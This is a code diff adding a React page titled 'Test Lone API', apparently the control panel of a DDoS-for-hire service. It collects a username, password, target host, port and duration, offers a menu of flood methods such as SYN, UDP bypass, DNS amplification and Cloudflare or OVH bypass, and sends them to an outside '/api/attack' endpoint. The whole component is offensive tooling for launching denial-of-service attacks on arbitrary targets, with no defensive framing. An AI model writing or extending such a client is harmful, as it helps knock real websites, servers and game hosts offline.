@@ -1,0 +1,117 @@
+import { useState, useEffect } from "react";
+import { motion, AnimatePresence } from "framer-motion";
+import { Button } from "@/components/ui/button";
+
+const TestAPI = () => {
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [host, setHost] = useState("");
+  const [port, setPort] = useState("");
+  const [time, setTime] = useState("");
+  const [method, setMethod] = useState("udp");
+  const [response, setResponse] = useState(null);
+  const [loading, setLoading] = useState(false);
+  const [isLoaded, setIsLoaded] = useState(false);
+
+  useEffect(() => {
+    setIsLoaded(true);
+  }, []);
+
+  const methods = [
+    "tls", "http-bypass", "https", "http-rapid", "http",
+    "udqp", "udp-bypass", "ovh", "syn", "placehol", "udp-bypassv2",
+    "tcp-boom", "tcp-drop", "drp", "socket", "tcp-drop",
+    "dns-amp", "discord", "fortc", "godkill",
+    "subnet", "soon.", "tls-priv", "http-raw",
+    "udp-star", "tcp-star", "ovh-star", "game-star", "syn-star", "http-star",
+    "http-hex", "cf-hex", "tcp-hex", "udp-hex", "syn-hex", "ovh-hex", "game-hex"
+  ];
+
+  const handleTestAPI = async () => {
+    setLoading(true);
+    setResponse(null);
+    
+    try {
+      const res = await fetch(
+        `https://api.loneservices.xyz/api/attack?username=${username}&password=${password}&target=${host}&port=${port}&time=${time}&method=${method}`
+      );
+      const data = await res.json();
+      setResponse(data);
+    } catch (error) {
+      setResponse({ error: "Failed to fetch response" });
+    }
+    
+    setLoading(false);
+  };
+
+  return (
+    <motion.div
+      initial={{ opacity: 0 }}
+      animate={isLoaded ? { opacity: 1 } : { opacity: 0 }}
+      exit={{ opacity: 0 }}
+      className="min-h-screen bg-gradient-to-br from-[#1a1a2e] to-[#3a0ca3] text-white p-10 flex flex-col items-center"
+    >
+      <h1 className="text-3xl font-bold mb-6">Test Lone API</h1>
+      <div className="w-full max-w-md space-y-4 bg-white/10 backdrop-blur-md p-6 rounded-lg shadow-xl border border-white/20">
+        <input
+          type="text"
+          placeholder="Username"
+          value={username}
+          onChange={(e) => setUsername(e.target.value)}
+          className="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500"
+        />
+        <input
+          type="password"
+          placeholder="Password"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          className="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500"
+        />
+        <input
+          type="text"
+          placeholder="Host"
+          value={host}
+          onChange={(e) => setHost(e.target.value)}
+          className="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500"
+        />
+        <input
+          type="text"
+          placeholder="Port"
+          value={port}
+          onChange={(e) => setPort(e.target.value)}
+          className="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500"
+        />
+        <input
+          type="text"
+          placeholder="Time (seconds)"
+          value={time}
+          onChange={(e) => setTime(e.target.value)}
+          className="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500"
+        />
+        <select
+          value={method}
+          onChange={(e) => setMethod(e.target.value)}
+          className="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500"
+        >
+          {methods.map((m, index) => (
+            <option key={index} value={m}>{m.toUpperCase()}</option>
+          ))}
+        </select>
+        <Button
+          onClick={handleTestAPI}
+          className="w-full bg-purple-600 hover:bg-purple-700 text-white font-semibold py-2 rounded"
+          disabled={loading}
+        >
+          {loading ? "Testing..." : "Test API"}
+        </Button>
+      </div>
+      {response && (
+        <div className="mt-6 p-4 bg-gray-800 rounded w-full max-w-md text-sm overflow-auto">
+          <pre className="text-green-400 font-mono">{JSON.stringify(response, null, 2)}</pre>
+        </div>
+      )}
+    </motion.div>
+  );
+};
+
+export default TestAPI;
